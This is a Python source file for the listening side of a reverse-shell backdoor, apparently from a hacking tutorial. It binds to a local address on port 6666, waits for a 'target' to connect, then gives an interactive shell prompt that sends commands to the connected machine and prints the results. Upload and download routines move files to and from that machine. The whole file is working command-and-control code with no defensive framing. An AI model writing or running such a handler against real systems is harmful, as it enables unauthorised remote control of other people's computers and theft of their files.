import socket
import json
import os

def reliable_send(data):
  jsondata = json.dumps(data)
  target.send(jsondata.encode())

def reliable_receive():
  data = ''
  while True:
    try:
      data = data + target.recv(1024).decode().rstrip()
      return json.loads(data)
    except ValueError:
      continue

def target_communication():
  while True:
    command = input('* Shell~%s: ' % str(ip))
    reliable_send(command)
    if command == 'quit':
      break
    elif command == 'clear':
      os.system('clear')
    elif command[:3] == 'cd ':
      pass
    elif command[:8] == 'download':
      download_file(command[9:])
    elif command[:6] == 'upload':
      upload_file(command[7:])
    else:
      result = reliable_receive()
      print(result)

def upload_file(file_name):
  f = open(file_name, 'rb')
  target.send(f.read())


def download_file(file_name):
	f = open(file_name, 'wb')
	target.settimeout(1)
	chunk = target.recv(1024)
	while chunk:
		f.write(chunk)
		try:
			chunk = target.recv(1024)
		except socket.timeout as e:
			break
	target.settimeout(None)
	f.close()

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('192.168.1.236', 6666)) # Or localhost?

print('[+] Listening for incoming connections')
sock.listen(5) # Listen for max 5 connections

target, ip = sock.accept()
print('[+] Target connected from: ' + str(ip))

target_communication()

